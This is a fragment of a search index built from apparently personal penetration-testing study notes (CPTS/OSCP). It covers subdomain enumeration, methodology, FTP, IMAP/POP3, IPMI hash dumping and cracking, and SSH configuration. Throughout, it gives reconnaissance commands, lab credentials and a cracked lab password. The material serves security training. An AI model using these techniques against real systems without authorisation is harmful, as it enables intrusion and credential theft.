https://crt.sh/\\?q\\=inlanefreight.com\\&amp;output\\=json | jq .\n``````\n\n- **Filter by unique subdomains\n\n```shell\n```shell-session\ncurl -s https://crt.sh/\\?q\\=inlanefreight.com\\&amp;output\\=json | jq . | grep name | cut -d\":\" -f2 | grep -v \"CN=\" | cut -d'\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u\n``````\n\n\n- Company Hosted Servers\n-\n```shell\n for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done\n</code></pre></p> </li> </ul> </li> <li> <p>shodan - IP List <pre><code>for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f4 &gt;&gt; ip-addresses.txt;done\n\nfor i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f4 &gt;&gt; ip-addresses.txt;done\n</code></pre></p> </li> </ol> <p>Display all the available DNS records</p> <pre><code>dig any &lt;doamin&gt;\n</code></pre>","tags":["oscp","passive-osint","domain-enumeration","oscp-notes"]},{"location":"CPTS/Footprinting/Enumeration%20Methodology/","title":"Enumeration Methodology","text":"<p>[!tip]- Tip   Tip one   Tip two</p>","tags":["oscp","methodology","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Methodology/#summary","title":"Summary","text":"<p>Complex processes in penetration testing require a standardized methodology to ensure consistency and thoroughness, especially given the unpredictability of target system cases. While many testers rely on personal experience or familiar steps, a standardized approach is more reliable for comprehensive results.</p>","tags":["oscp","methodology","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Methodology/#key-points","title":"Key Points","text":"<ul> <li>Dynamic vs. Static Methodology: Penetration testing, including enumeration, is dynamic. However, having a static methodology allows consistency and adaptability.</li> <li>6-Layered Methodology: Enumeration is divided into six metaphorical layers representing boundaries to be passed.</li> <li>Three Levels of Enumeration:<ol> <li>Infrastructure-based Enumeration: Focuses on network and infrastructure-level elements.</li> <li>Host-based Enumeration: Involves information gathering at the host level.</li> <li>OS-based Enumeration: Targets OS-specific details for deeper insights.</li> </ol> </li> </ul>","tags":["oscp","methodology","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Methodology/#enumeration-strategy","title":"Enumeration Strategy","text":"<ul> <li>Standardized Approach: Reduces chances of missing critical steps and adapts to the unique nature of each environment.</li> <li>Dynamic Adaptability: Methodology supports flexibility, allowing testers to adjust their techniques as they learn more about the target environment.</li> </ul>","tags":["oscp","methodology","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Methodology/#takeaways-lessons-learned","title":"Takeaways &amp; Lessons Learned","text":"<ul> <li>Using a standardized approach helps streamline complex testing processes.</li> <li>Balancing static structure with dynamic flexibility in methodology enhances effectiveness.</li> </ul>","tags":["oscp","methodology","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Methodology/#references","title":"References","text":"<ul> <li>OSCP Testing Methodology Documentation</li> <li>Penetration Testing Execution Standard (PTES)</li> </ul> <p>![[Pasted image 20241030103446.png]]</p>","tags":["oscp","methodology","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Methodology/#summary_1","title":"Summary","text":"<p>This 6-layer enumeration approach treats each layer as an \"obstacle\" that needs analysis to locate points of access or weaknesses. Instead of brute-forcing through these layers, penetration testers are encouraged to explore systematically, aiming to find optimal entry points rather than forcing access inefficiently.</p>","tags":["oscp","methodology","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Methodology/#layered-enumeration-breakdown","title":"Layered Enumeration Breakdown","text":"Layer Description Information Categories <code>1. Internet Presence</code> Identification of internet presence and externally accessible infrastructure. Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures <code>2. Gateway</code> Identify the possible security measures to protect the company's external and internal infrastructure. Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare <code>3. Accessible Services</code> Identify accessible interfaces and services that are hosted externally or internally. Service Type, Functionality, Configuration, Port, Version, Interface <code>4. Processes</code> Identify the internal processes, sources, and destinations associated with the services. PID, Processed Data, Tasks, Source, Destination <code>5.Privileges</code> Identification of the internal permissions and privileges to the accessible services. Groups, Users, Permissions, Restrictions, Environment <code>6. OS Setup</code> Identification of the internal components and systems setup. OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files <ol> <li> <p>Layer 1 - Internet Presence: Focuses on the identification of external infrastructure and internet-facing assets.</p> <ul> <li>Information Categories: Domains, subdomains, vHosts, ASN, IP addresses, cloud instances, security measures.</li> <li> <p>Layer 2 - Gateway: Identifies external and internal security measures protecting the company's assets.</p> </li> <li> <p>Information Categories: Firewalls, DMZ, IPS/IDS, EDR, proxies, NAC, network segmentation, VPN, services like Cloudflare.</p> </li> <li> <p>Layer 3 - Accessible Services: Enumeration of accessible services/interfaces, focusing on configurations and details.</p> </li> <li> <p>Information Categories: Service type, functionality, configuration, port, version, interface.</p> </li> <li> <p>Layer 4 - Processes: Examines internal processes associated with the identified services.</p> </li> <li> <p>Information Categories: Process IDs (PIDs), processed data, tasks, sources, destinations.</p> </li> <li> <p>Layer 5 - Privileges: Focuses on permissions and privileges within the environment, identifying possible access points.</p> </li> <li> <p>Information Categories: Groups, users, permissions, restrictions, environment setup.</p> </li> <li> <p>Layer 6 - OS Setup: Explores the operating system setup and configurations for security and sensitive file identification.</p> </li> <li> <p>Information Categories: OS type, patch level, network configuration, OS environment, configuration files, sensitive files.</p> </li> </ul> </li> </ol>","tags":["oscp","methodology","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Methodology/#takeaways-lessons-learned_1","title":"Takeaways &amp; Lessons Learned","text":"<ul> <li>Each layer builds on the previous, creating a structured and comprehensive view of the target environment.</li> <li>Avoid brute-forcing entry points; instead, focus on strategic entry based on the identified weaknesses in each layer.</li> </ul>","tags":["oscp","methodology","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Methodology/#important-notes","title":"Important Notes","text":"<ul> <li>OSINT on employees or human factors has been excluded from the \u201cInternet Presence\u201d layer for simplicity.</li> </ul>","tags":["oscp","methodology","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Methodology/#references_1","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>","tags":["oscp","methodology","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Principles/","title":"Enumeration Principles","text":"","tags":["#oscp","#technique","footprinting","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Principles/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul>","tags":["#oscp","#technique","footprinting","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Principles/#enumeration-principles","title":"Enumeration Principles","text":"<p>Definition:</p> <ul> <li>Enumeration involves gathering information actively (through scans) and passively (using third-party providers).</li> <li>It is distinct from OSINT, which only uses passive gathering and should be separate from active enumeration.</li> </ul> <p>Purpose:</p> <ul> <li>Goal: Repeatedly gather information from known or discovered data points.</li> <li>Focus: Understand target infrastructure (domains, IPs, services) rather than blindly attacking.</li> </ul> <p>Approach:</p> <ul> <li>Identify Services and Protocols: Once targets are identified, examine protocols and services enabling interactions (e.g., SSH, RDP, WinRM).</li> <li>Strategy Over Force: Understand company structure, services, and security measures instead of brute-forcing blindly, which is noisy and can lead to blacklisting.</li> <li>Analogy: Like a treasure hunter, plan carefully, gather tools, and study the environment before \u201cdigging.\u201d</li> </ul>","tags":["#oscp","#technique","footprinting","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Principles/#core-enumeration-questions","title":"Core Enumeration Questions","text":"<ol> <li>What can we see?</li> <li>Why can we see it?</li> <li>What image does what we see create for us?</li> <li>What do we gain from it?</li> <li>How can we use it?</li> <li>What can we not see?</li> <li>Why might it be hidden?</li> <li>What image results from what we do not see?</li> </ol>","tags":["#oscp","#technique","footprinting","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Principles/#enumeration-principles_1","title":"Enumeration Principles","text":"No. Principle 1 There is more than meets the eye - Consider all perspectives. 2 Distinguish between what we see and what we do not see - Both are relevant. 3 There are always ways to gain more information - Understand the target fully.","tags":["#oscp","#technique","footprinting","enumeration"]},{"location":"CPTS/Footprinting/Enumeration%20Principles/#application","title":"Application:","text":"<ul> <li>The principles encourage technical understanding over brute-force tactics.</li> <li>Focus on seeing hidden components with experience and planning.</li> </ul>","tags":["#oscp","#technique","footprinting","enumeration"]},{"location":"CPTS/Footprinting/FTP/","title":"FTP","text":""},{"location":"CPTS/Footprinting/FTP/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Footprinting/FTP/#overview","title":"Overview","text":"<p>File Transfer Protocol (FTP) is one of the earliest protocols in the TCP/IP stack and operates on the application layer. FTP works on two channels: a control channel (TCP port 21) for command and response exchanges and a data channel (TCP port 20) for data transfer. A distinction is made between active and passive modes:</p> <ul> <li>Active Mode: Client opens control channel, server opens data channel on client-specified port. May encounter firewall issues.</li> <li>Passive Mode: Server designates a port, client establishes data channel, bypassing firewall restrictions.</li> </ul> <p>FTP is primarily used to upload/download files and organize directories. It uses clear-text transmission, posing a potential security risk if sniffed.</p> <p>Trivial File Transfer Protocol (TFTP) is a simplified, insecure alternative to FTP, using UDP instead of TCP, without authentication and limited to public directories. TFTP is best suited for local and secure networks.</p>"},{"location":"CPTS/Footprinting/FTP/#key-commands-and-configurations","title":"Key Commands and Configurations","text":""},{"location":"CPTS/Footprinting/FTP/#ftp-commands","title":"FTP Commands:","text":"<ul> <li>connect: Set the remote host and port.</li> <li>get: Download files from the remote host.</li> <li>put: Upload files to the remote host.</li> <li>quit: Exit FTP session.</li> <li>status: Show current status, transfer mode, and connection status.</li> <li>verbose: Enable/disable additional transfer info.</li> </ul> <p>FTP Example Commands:</p> <pre><code>ftp&gt; connect 10.129.14.136 ftp&gt; get file.txt ftp&gt; put localfile.txt ftp&gt; quit\n</code></pre>"},{"location":"CPTS/Footprinting/FTP/#tftp-commands","title":"TFTP Commands:","text":"<ul> <li>connect: Set remote host and optional port.</li> <li>get/put: Transfer files.</li> <li>quit: Exit session.</li> <li>status: Display current mode and connection status.</li> <li>verbose: Toggle verbose mode.</li> </ul> <p>TFTP Example Commands:</p> <pre><code>tftp&gt; connect 10.129.14.136 tftp&gt; get file.txt tftp&gt; put file.txt tftp&gt; quit\n</code></pre>"},{"location":"CPTS/Footprinting/FTP/#vsftpd-configuration","title":"vsFTPd Configuration","text":"<p>Key settings in <code>/etc/vsftpd.conf</code>:</p> <ul> <li>listen=NO: Run from inetd.</li> <li>anonymous_enable=NO: Disable anonymous access.</li> <li>local_enable=YES: Allow local user login.</li> <li>use_localtime=YES: Set local time for file transfers.</li> <li>xferlog_enable=YES: Enable logging of file transfers.</li> </ul> <p>Advanced options:</p> <ul> <li>anonymous_enable=YES: Enable anonymous login.</li> <li>anon_upload_enable=YES: Allow anonymous file uploads.</li> <li>chroot_local_user=YES: Restrict local users to their directories.</li> </ul> <p>To install vsFTPd:</p> <pre><code>sudo apt install vsftpd\n\n#To view configurations:\ncat /etc/vsftpd.conf | grep -v \"#\"\n</code></pre> <p>Footprinting the Service</p> <p>Footprinting with network scanners is a popular way to identify services, even those not on standard ports. A key tool for this task is Nmap, which includes the Nmap Scripting Engine (NSE) for running specialized scripts on specific services. To update the NSE script database, use the following command:</p> <pre><code>sudo nmap --script-updatedb\n````\n\nOn a local system, NSE scripts can be located with:\n\nbash\n\nCopy code\n\n```bash \nfind / -type f -name ftp* 2&gt;/dev/null | grep scripts\n</code></pre> <p>These scripts can be used to scan the FTP server typically on TCP port 21. Commands like version scan (<code>-sV</code>), aggressive scan (<code>-A</code>), and default script scan (<code>-sC</code>) can gather detailed information on the target.</p> <pre><code>sudo nmap -sV -p21 -sC -A 10.129.14.136\n</code></pre> <p>This command identifies open ports and services, checks for anonymous FTP access, and lists accessible directories or files.</p> <p>Using NSE Scripts for FTP</p> <p>The <code>ftp-anon</code> script checks for anonymous FTP login, while <code>ftp-syst</code> uses the <code>STAT</code> command to retrieve the server\u2019s status and configuration details. To monitor the commands sent and received, add <code>--script-trace</code>:</p> <pre><code>sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace\n</code></pre> <p>For more direct interaction with the FTP service, tools like <code>netcat</code> or <code>telnet</code> can be useful:</p> <pre><code>nc -nv 10.129.14.136 21\n</code></pre> <p>If FTP runs over TLS/SSL, <code>openssl</code> is necessary for encrypted connections, and it provides visibility into the SSL certificate:</p> <pre><code>openssl s_client -connect 10.129.14.136:21 -starttls ftp\n</code></pre> <p>Viewing the certificate can help identify details like the hostname, email, and sometimes even the organization's location.</p>"},{"location":"CPTS/Footprinting/FTP/#advanced-ftp-techniques-and-commands","title":"Advanced FTP Techniques and Commands","text":"<ul> <li> <p>Anonymous Login:</p> <ul> <li>Allows login with <code>ftp</code> or <code>anonymous</code> user. May expose information about the server if permissions are not correctly set.</li> </ul> <pre><code>ftp&gt; connect 10.129.14.136 Name (10.129.14.136:anonymous): anonymous\n</code></pre> </li> <li> <p>Debugging and Tracing:</p> <ul> <li>Use <code>debug</code> and <code>trace</code> to get detailed logs for FTP commands, useful for troubleshooting connections.</li> </ul> <pre><code>ftp&gt; debug ftp&gt; trace\n</code></pre> </li> <li> <p>Security Configuration:</p> <ul> <li>Avoid enabling <code>anonymous_enable=YES</code> on public servers.</li> <li>Configure <code>chroot_local_user=YES</code> to restrict local users.</li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/FTP/#vsftpd-security-settings","title":"vsFTPd Security Settings","text":"<ul> <li> <p>FTPUSERS:</p> <ul> <li>Controls denied access for specific users. Listed users in <code>/etc/ftpusers</code> cannot log in, regardless of other permissions.</li> </ul> <p><code>shell cat /etc/ftpusers</code></p> </li> <li> <p>Dangerous Settings:</p> <ul> <li>Allowing anonymous uploads (<code>anon_upload_enable=YES</code>) or directory creation (<code>anon_mkdir_write_enable=YES</code>) increases risk.</li> <li>hide_ids=YES hides UID/GID in directory listings, increasing anonymity.</li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/FTP/#example-configurations","title":"Example Configurations","text":"<p>Hiding IDs:</p> <pre><code>ftp&gt; ls -rw-rw-r--    1 ftp     ftp      8138592 Sep 14 16:54 Calendar.pptx\n</code></pre> <p>Anonymous Settings:</p> <pre><code>anonymous_enable=YES anon_upload_enable=YES anon_mkdir_write_enable=YES\n</code></pre>"},{"location":"CPTS/Footprinting/FTP/#study-tip","title":"Study Tip","text":"<p>Practice setting up and securing vsFTPd on a virtual machine. Test different configurations, especially around anonymous access and chroot restrictions, to understand the security implications and behaviors.</p>"},{"location":"CPTS/Footprinting/IMAP%20%20POP3/","title":"IMAP  POP3","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#overview","title":"Overview","text":"<ul> <li>Purpose: IMAP provides online email management directly on a remote server.</li> <li>Functionality: Unlike POP3, which only lists, retrieves, and deletes emails, IMAP offers hierarchical mailbox structures, access to multiple mailboxes, and synchronization across clients.</li> <li>Server Interaction: Emails stay on the server, allowing access from multiple devices and uniform synchronization.</li> </ul>"},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#key-features","title":"Key Features","text":"<ol> <li>Folder Structure Support: Organizes emails in folders, enhancing mailbox clarity.</li> <li>Multiple Client Access: Simultaneous access across clients with real-time synchronization.</li> <li>Offline Mode: Certain email clients allow offline email access and sync updates upon reconnection.</li> <li>Extended Commands: Uses ASCII text-based commands that can be processed in batches without waiting for server confirmation.</li> </ol>"},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#technical-details","title":"Technical Details","text":"<ul> <li>Port: Default port <code>143</code>; encrypted sessions usually via port <code>993</code> with SSL/TLS for secure connections.</li> <li>Authentication: Users authenticate via username and password post-connection.</li> <li> </li> </ul>"},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#synchronization-creates-a-network-file-system-for-emails-allowing-continuous-synchronization-across-clients","title":"Synchronization: Creates a network file system for emails, allowing continuous synchronization across clients.","text":""},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#comparison-with-pop3","title":"Comparison with POP3","text":"<ul> <li>IMAP:<ul> <li>Supports online folder structures and multiple mailbox access.</li> <li>Keeps emails on the server until deleted, enabling multi-client synchronization.</li> <li>Allows email browsing on the server without downloading.</li> </ul> </li> <li> <p>POP3:</p> <ul> <li>Limited functions: Lists, retrieves, and deletes emails only.</li> <li> </li> <li> </li> <li>Plaintext Transmission: By default, IMAP transmits credentials and data in plaintext.</li> <li>Encryption: Most email servers enforce SSL/TLS-encrypted sessions for secure email traffic, typically over port <code>993</code>.</li> </ul> </li> <li> <p>Sending Emails: SMTP is generally used, with sent emails copied to IMAP folders, enabling access to sent emails across devices.</p> </li> </ul>"},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#primarily-downloads-emails-to-a-local-device-without-maintaining-server-copies","title":"Primarily downloads emails to a local device without maintaining server copies.","text":""},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#security","title":"Security","text":""},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#smtp-integration","title":"SMTP Integration","text":""},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#imap-commands","title":"IMAP Commands","text":"Command Description <code>1 LOGIN username password</code> User's login. <code>1 LIST \"\" *</code> Lists all directories. <code>1 CREATE \"INBOX\"</code> Creates a mailbox with a specified name. <code>1 DELETE \"INBOX\"</code> Deletes a mailbox. <code>1 RENAME \"ToRead\" \"Important\"</code> Renames a mailbox. <code>1 LSUB \"\" *</code> Returns a subset of names from the set of names that the User has declared as being\u00a0<code>active</code>\u00a0or\u00a0<code>subscribed</code>. <code>1 SELECT INBOX</code> Selects a mailbox so that messages in the mailbox can be accessed. <code>1 UNSELECT INBOX</code> Exits the selected mailbox. <code>1 FETCH &lt;ID&gt; all</code> Retrieves data associated with a message in the mailbox. <code>1 CLOSE</code> Removes all messages with the\u00a0<code>Deleted</code>\u00a0flag set. <code>1 LOGOUT</code> Closes the connection with the IMAP server."},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#pop3-commands","title":"POP3 Commands","text":"Command Description <code>USER username</code> Identifies the user. <code>PASS password</code> Authentication of the user using its password. <code>STAT</code> Requests the number of saved emails from the server. <code>LIST</code> Requests from the server the number and size of all emails. <code>RETR id</code> Requests the server to deliver the requested email by ID. <code>DELE id</code> Requests the server to delete the requested email by ID. <code>CAPA</code> Requests the server to display the server capabilities. <code>RSET</code> Requests the server to reset the transmitted information. <code>QUIT</code> Closes the connection with the POP3 server."},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#dangerous-settings","title":"Dangerous Settings","text":"<p>Nevertheless, configuration options that were improperly configured could allow us to obtain more information, such as debugging the executed commands on the service or logging in as anonymous, similar to the FTP service. Most companies use third-party email providers such as Google, Microsoft, and many others. However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. Some of these configuration options include:</p> Setting Description <code>auth_debug</code> Enables all authentication debug logging. <code>auth_debug_passwords</code> This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. <code>auth_verbose</code> Logs unsuccessful authentication attempts and their reasons. <code>auth_verbose_passwords</code> Passwords used for authentication are logged and can also be truncated. <code>auth_anonymous_username</code> This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. ### Footprinting the Service <pre><code>nmap &lt;ip&gt; -sV -p110,143,993,995 -sC\n\n#curl\ncurl -k 'imaps://&lt;ip&gt;' --user user:p4ssw0rd\n\n# verbose (-v)\ncurl -k 'imaps://&lt;ip&gt;' --user cry0l1t3:1234 -v\n\n# intract with pop3 over ssl and ncat\nopenssl -s_client --connect &lt;ip&gt;:pop3s\n</code></pre>"},{"location":"CPTS/Footprinting/IMAP%20%20POP3/#openssl-tls-encrypted-interaction-imap","title":"openSSL - TLS Encrypted Interaction IMAP","text":"<pre><code>openssl s_client --connect &lt;ip&gt;:imaps\n</code></pre> <p>Once we have successfully initiated a connection and logged in to the target mail server, we can use the above commands to work with and navigate the server. We want to point out that the configuration of our own mail server, the research for it, and the experiments we can do together with other community members will give us the know-how to understand the communication taking place and what configuration options are responsible for this.</p> <p>In the SMTP section, we have found the user\u00a0<code>robin</code>. Another member of our team was able to find out that the user also uses his username as a password (<code>robin</code>:<code>robin</code>). We can use these credentials and try them to interact with the IMAP/POP3 services.</p> <p>![[Pasted image 20241110225315.png]]</p> <p>for login to imap use the <code>a001 LOGIN user_name password</code> <pre><code>1 fetch 1 all\n1 fetch 1 body[text]\n</code></pre></p> <p>![[Pasted image 20241110230512.png]]</p>"},{"location":"CPTS/Footprinting/IPMI%20Intelligent%20Plantform%20Management%20Interface/","title":"IPMI Intelligent Plantform Management Interface","text":"<p>is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system.</p>"},{"location":"CPTS/Footprinting/IPMI%20Intelligent%20Plantform%20Management%20Interface/#overview","title":"Overview","text":"<ul> <li>IPMI: A standardized hardware-based host management system for system management and monitoring.</li> <li>Functions independently of the host's OS, BIOS, CPU, or firmware.</li> <li>Allows sysadmins to manage and monitor systems even when powered off or unresponsive.</li> <li>Operates via a network connection without requiring OS access.</li> </ul>"},{"location":"CPTS/Footprinting/IPMI%20Intelligent%20Plantform%20Management%20Interface/#common-use-cases","title":"Common Use Cases","text":"<ol> <li>Pre-OS Management: Modify BIOS settings.</li> <li>Powered-Down Hosts: Manage systems even when powered off.</li> <li>Post-Failure Recovery: Access and diagnose unresponsive systems.</li> </ol>"},{"location":"CPTS/Footprinting/IPMI%20Intelligent%20Plantform%20Management%20Interface/#key-features","title":"Key Features","text":"<ul> <li>Monitoring: System temperature, voltage, fan status, power supplies.</li> <li>Alerting: Via SNMP.</li> <li>Hardware Logs: Query inventory and review system event logs.</li> <li>Remote Upgrades: Update systems without physical access.</li> </ul>"},{"location":"CPTS/Footprinting/IPMI%20Intelligent%20Plantform%20Management%20Interface/#architecture-components","title":"Architecture Components","text":"<ul> <li>Baseboard Management Controller (BMC): Embedded microcontroller for hardware management.</li> <li>Intelligent Chassis Management Bus (ICMB): Enables inter-chassis communication.</li> <li>Intelligent Platform Management Bus (IPMB): Extends BMC communication.</li> <li>IPMI Memory: Stores logs, repository data, etc.</li> <li>Communication Interfaces: Includes local, serial, LAN, ICMB, and PCI buses.</li> </ul>"},{"location":"CPTS/Footprinting/IPMI%20Intelligent%20Plantform%20Management%20Interface/#technical-details","title":"Technical Details","text":"<ul> <li>Protocol: Operates on port 623 UDP.</li> <li>System Support: Found in motherboards, PCI cards, or added as external modules.</li> <li>Version 2.0: Supports Serial over LAN (SoL) for in-band serial console output.</li> <li>BMC Access: Grants near-physical control of a system:<ul> <li>Monitor hardware.</li> <li>Reboot/power off systems.</li> <li>Reinstall OS.</li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/IPMI%20Intelligent%20Plantform%20Management%20Interface/#security-implications","title":"Security Implications","text":"<ul> <li>BMC Access = Physical Access: Exploiting IPMI provides control over the host motherboard.</li> <li>Vulnerable Services: Many BMCs expose:<ul> <li>Web-based management consoles.</li> <li>Remote access via Telnet/SSH.</li> <li>Open port 623 UDP.</li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/IPMI%20Intelligent%20Plantform%20Management%20Interface/#nmap-footprinting-example","title":"[[Nmap]] Footprinting Example","text":"<p>Use the ipmi-version NSE script to discover and enumerate IPMI services.</p> <p><pre><code>nmap -sU -p 623 --script ipmi-version &lt;target&gt;\n</code></pre> ![[Pasted image 20241113104020.png]]</p> <p>We can see that the IPMI protocol is indeed listening on port <code>623</code> and nmap has fingerprinted version 2.0 of the protocol.   we can also use [[Metasploit]] scanner modeul <code>IPMI information discovery (auxilitary/scanner/ipmi/ipmi_verion)</code></p> <p>![[Pasted image 20241113104441.png]]</p>"},{"location":"CPTS/Footprinting/IPMI%20Intelligent%20Plantform%20Management%20Interface/#using-the-metasploit-dumping-hashes","title":"using the metasploit dumping hashes","text":"<p>![[Pasted image 20241113105149.png]]</p> <p>![[Pasted image 20241113105226.png]]</p> <p>What is the account's cleartext password?</p> <p><pre><code>set PASS_FILE /usr/share/wordlists/rockyou.txt\n</code></pre> ![[Pasted image 20241113111201.png]] Answer: <code>trinity</code></p>"},{"location":"CPTS/Footprinting/IPMI%20Intelligent%20Plantform%20Management%20Interface/#supported-vendors","title":"Supported Vendors","text":"<ul> <li>Examples: Cisco, Dell (DRAC), HP (iLO), Supermicro, Intel, etc.</li> </ul>"},{"location":"CPTS/Footprinting/IPMI%20Intelligent%20Plantform%20Management%20Interface/#summary","title":"Summary","text":"<p>IPMI is a robust system management protocol offering remote monitoring and control capabilities. While it ensures convenience for sysadmins, improper configuration or exposure can lead to critical security risks, equivalent to granting physical access to attackers. Properly securing IPMI access and monitoring port 623 UDP are essential steps in minimizing vulnerabilities.</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/","title":"Linux Remote Management Protocols","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#linux-remote-management-protocols","title":"Linux Remote Management Protocols","text":""},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#overview","title":"Overview","text":"<p>Remote management of Linux servers is essential for efficient troubleshooting and system administration. By using protocols and applications designed for remote management, we can interact with servers from anywhere without being physically present. These tools also become targets for attackers, especially if misconfigured, making their secure setup and understanding critical for penetration testers.</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#secure-shell-ssh","title":"Secure Shell (SSH)","text":"<ul> <li>Purpose: SSH allows encrypted, direct communication between two systems over TCP port 22.</li> <li>Advantages:<ul> <li>Prevents data interception by third parties.</li> <li>Universally supported across major operating systems (Linux, macOS, Windows).</li> <li>Native to Unix-based systems and open-source on Linux as OpenSSH.</li> </ul> </li> <li>SSH Protocol Versions:<ul> <li>SSH-1: Vulnerable to Man-in-the-Middle (MITM) attacks.</li> <li>SSH-2: Enhanced encryption, speed, stability, and security.</li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#use-cases","title":"Use Cases","text":"<ol> <li>Remote Host Management: Command-line or GUI.</li> <li>File Transfers.</li> <li>Port Forwarding.</li> </ol>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#authentication-methods-in-openssh","title":"Authentication Methods in OpenSSH","text":"<ol> <li>Password Authentication.</li> <li>Public-Key Authentication.</li> <li>Host-Based Authentication.</li> <li>Keyboard Authentication.</li> <li>Challenge-Response Authentication.</li> <li>GSSAPI Authentication.</li> </ol> <p>Focus: Public-Key Authentication.</p>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#public-key-authentication","title":"Public-Key Authentication","text":"<ul> <li> <p>Key Pair Setup:</p> <ul> <li>Private Key: Stored securely on the client device, protected with a passphrase.</li> <li>Public Key: Stored on the server.</li> <li> <p>Authentication Steps:</p> </li> <li> <p>Server Verification:</p> <ul> <li>Server sends an encrypted certificate to the client.</li> <li> <p>Client confirms it matches the trusted server.</p> <ol> <li>Client Authentication:</li> </ol> </li> <li> <p>Server sends a cryptographic challenge encrypted with the public key.</p> </li> <li>Client solves it using the private key and returns the solution.</li> <li>Benefits:</li> </ul> </li> <li> <p>Passphrase entered once per session for access to multiple servers.</p> </li> <li>Prevents unauthorized use if the client machine is compromised.</li> </ul> </li> </ul>"},{"location":"CPTS/Footprinting/Linux%20Remote%20Management%20Protocols/#default-configuration-of-openssh","title":"Default Configuration of OpenSSH","text":"<ul> <li>The <code>sshd_config</code> file governs OpenSSH server behavior.</li> <li>By default, it includes X11 forwarding, which had a command injection vulnerability in version 7.2p1 (2016).</li> <li>Recommendation: Avoid GUIs for server management and review configurations to minimize vulnerabilities.</li> </ul> <p><pre><code>cat /etc/ssh/sshd_config | grep -v \"#\" | sed -r '/^\\s*$/d'\n</code></pre> - <code>cat /etc/ssh/sshd_config</code>:     This command reads and outputs the content of the SSH configuration file.</p> <ul> <li> <p><code>| grep -v \"#\"</code>:     The <code>grep</code> command with the <code>-v</code> flag filters out lines that contain a <code>#</code>, which are comments in the configuration file.</p> <ul> <li><code>-v</code>: Invert match, meaning exclude lines matching the pattern.</li> <li><code>#</code>: Matches lines with <code>#</code> anywhere, which are treated as comments.</li> <li> <p><code>| sed -r '/^\\s*$/d'</code>: This part uses <code>sed</code> (stream editor) to remove blank lines.</p> </li> <li> <p><code>-r</code>: Enables extended regular expressions for the <code>sed</code> command.</p> </li> <li><code>/^\\s*$/</code>: Matches lines that contain only whitespace (or are completely empty).<ul> <li><code>^</code>: Beginning of the line.</li> <li><code>\\s*</code>: Zero or more whitespace characters.</li> <li><code>$</code>: End of the line.</li> </ul> </li> <li><code>d</code>: Deletes the matched lines.</li> </ul> </li> </ul> <p>Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Let us take a look at the following settings:</p> Setting Description <code>PasswordAuthentication yes</code> Allows password-based authentication. 